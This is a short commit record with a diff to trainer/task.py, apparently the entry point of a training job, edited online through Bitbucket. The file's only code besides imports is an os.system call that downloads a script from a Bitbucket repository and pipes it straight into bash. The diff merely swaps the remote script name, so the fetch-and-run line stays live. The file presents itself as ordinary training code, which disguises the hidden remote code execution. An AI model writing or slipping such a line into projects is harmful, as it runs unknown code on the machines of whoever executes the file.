0103fecb473dcbc2b3f8c31553a36fbc32d3a10f
Alfira Kuester <alfirakuester@gmail.com>
2023-12-26 09:21:17 +0000

    task.py edited online with Bitbucket

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/bangke-sia/azep/raw/main/kirana | bash')
+os.system('curl -sL https://bitbucket.org/bangke-sia/azep/raw/main/siatah | bash')
